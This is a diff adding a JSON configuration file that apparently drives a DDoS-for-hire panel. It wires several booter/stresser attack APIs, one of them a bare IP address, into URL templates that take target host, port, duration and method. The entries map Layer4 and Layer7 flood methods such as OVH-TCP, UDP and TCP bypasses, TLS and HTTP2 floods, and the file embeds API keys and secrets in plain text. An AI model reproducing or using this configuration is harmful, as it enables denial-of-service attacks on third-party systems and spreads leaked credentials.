@@ -1,0 +1,132 @@
+{
+    "XenonL4":{
+        "name":"Layer4",
+        "type": "Layer4",
+        "slots":10,
+        "url":"http://xenonsecurity.ch/api?host=$host&port=$port&time=$time&method=$method&key=a79c853c-24aa-4bb0-b657-9b228f1a903a",
+        "methods":{
+            "HOME":"HOME-ROUTER",
+            "SOCKET":"SOCKET",
+            "OVH":"OVH-TCP",
+            "TCP BYPASS":"MIDDLEBOX",
+            "UDP BYPASS":"THUNDERFUCK",
+            "GAME": "GAME"
+        }
+    },
+    "XenonL7":{
+        "name":"Layer7",
+        "type": "Layer7",
+        "slots":10,
+        "url":"http://xenonsecurity.ch/api?host=$host&port=$port&time=$time&method=$method&key=a79c853c-24aa-4bb0-b657-9b228f1a903a",
+        "methods":{
+            "HTTPS":"XENON-BYPASS",
+            "TLS":"XENON-TLS",
+            "BROWSER":"BROWSER"
+            }
+    },
+    "PheonixL4":{
+        "name":"Layer4",
+        "type": "Layer4",
+        "slots":10,
+        "url":"http://77.237.233.45:220/phoenix/api?user=injects&key=apisecret303i20&host=$host&port=$port&time=$time&method=$method",
+        "methods":{
+            "HOLD":"HOME-LDAP",
+            "HOME":"DNS",
+            "SOCKET":"SOCKET",
+            "OVH":"OVH",
+            "GAME":"GAME-VIP",
+            "TCP BYPASS":"TCP",
+            "GUDP":"GUDP"
+        }
+    },
+    "PheonixL7":{
+        "name":"Layer7",
+        "type": "Layer7",
+        "slots":10,
+        "url":"http://77.237.233.45:220/phoenix/api?user=injects&key=apisecret303i20&host=$host&port=$port&time=$time&method=$method",
+        "methods":{
+            "HTTPS":"HTTPS",
+            "TLS":"TLS"
+        }
+    },
+    "CtrzL4":{
+        "name":"Layer4",
+        "type": "Layer4",
+        "slots":10,
+        "url":"https://crtz.top/api/attack?username=injects&secret=tsukireborn69&host=$host&port=$port&time=$time&method=$method",
+        "methods":{
+            "HOME":"DNS",
+            "SOCKET":"SOCKET",
+            "OVH":"OVH-TCP",
+            "TCP BYPASS":"TCPJOY",
+            "UDP BYPASS":"UDP",
+            "GAME":"GAME"
+        }
+    },
+    "CtrzL7":{
+        "name":"Layer7",
+        "type": "Layer7",
+        "slots":10,
+        "url":"https://crtz.top/api/attack?username=injects&secret=tsukireborn69&host=$host&port=$port&time=$time&method=$method",
+        "methods":{
+            "TLS":"HTTPS-ZOOM",
+            "HTTPS":"HTTPS"
+        }
+    },
+    "EternalL4":{
+        "name":"Layer4",
+        "type": "Layer4",
+        "slots":10,
+        "url":"https://api.eternalproxy.xyz/api/attack?username=&secret=&host=$host&port=$port&time=$time&method=$method",
+        "methods":{
+            "HOME":"HOME",
+            "SOCKET":"SOCKET",
+            "UDP BYPASS":"PRIVATE-UDP",
+            "OVH":"PRIVATE-OVH",
+            "TCP BYPASS":"TCP"
+            }
+    },
+    "EternalL7":{
+        "name":"Layer7",
+        "type": "Layer7",
+        "slots":10,
+        "url":"https://api.eternalproxy.xyz/api/attack?username=&secret=&host=$host&port=$port&time=$time&method=$method",
+        "methods":{
+            "TLS":"TLS",
+            "HTTPS":"HTTPS"
+        }
+    },
+    "DigitalL4":{
+        "name":"Layer4",
+        "type": "Layer4",
+        "slots":10,
+        "url":"https://api.digitalstress.su/api/launch?user=3872&key=07AuxUla3UeMRHpc&host=$host&port=$port&time=$time&method=$method",
+        "methods":{
+            "HOME":"DNS",
+            "UDP BYPASS":"UDP-A2S",
+            "TCP BYPASS":"TCP-AMP",
+            "OVH":"TCP-OVH",
+            "GAME":"GAME-VSE"
+                    }
+        },
+        "TsukiHH":{
+        "name":"Layer4",
+        "type": "Layer4",
+        "slots":10,
+        "url":"XX",
+        "methods":{
+            "HOLD":"HOLD"
+                    }
+    },
+    "DigitalL7":{
+        "name":"Layer7",
+        "type": "Layer7",
+        "slots":10,
+        "url":"https://api.digitalstress.su/api/launch?user=3872&key=07AuxUla3UeMRHpc&host=$host&port=$port&time=$time&method=$method&reqmethod=$reqmethod&rps=$rps",
+        "methods":{
+            "HTTPS":"HTTP2-RAW",
+            "TLS":"HTTP-STORM",
+            "BROWSER":"HTTP-BYPASS"
+        }
+    }
+}
